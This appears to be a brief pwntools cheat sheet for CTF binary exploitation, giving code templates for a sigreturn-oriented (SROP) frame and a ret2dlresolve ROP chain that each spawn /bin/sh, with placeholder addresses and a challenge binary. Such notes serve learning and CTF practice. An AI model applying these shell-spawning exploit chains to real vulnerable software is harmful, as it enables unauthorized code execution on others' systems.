# rop

## SIGROP

> from pwn import *
>       
> BIN_SH = 0xcafebabe   # addr of "/bin/sh\x00"
> SYSCALL = 0xdeadbeef  # addr of syscall instruction 
>        
> frame = SigreturnFrame(kernel="amd64")
> frame.rax = constants.SYS_execve
> frame.rdi = BIN_SH
> frame.rsi = 0x0
> frame.rdx = 0x0
> frame.rip = SYSCALL
>        
> payload = bytes(frame)

[Talk](https://www.youtube.com/watch?v=ADULSwnQs-s)

## Ret2dlresolve

> from pwn import *
>      
> exe = context.binary = ELF('challenge')
>     
> dlresolve = Ret2dlresolvePayload(exe, symbol="system", args=["/bin/sh\x00"])
> # dlresolve.data_addr # Addr of RW memory area
> # dlresolve.payload   # fake structures
>    
> rop = ROP(exe)
> rop.read(0, dlresolve.data_addr) # ROP to read fake structures
> rop.ret2dlresolve(dlresolve)     # ROP to call _dl_runtime_resolve
>
> raw_rop = rop.chain()            # Full ROP chain

[Talk](https://www.youtube.com/watch?v=ADULSwnQs-s)
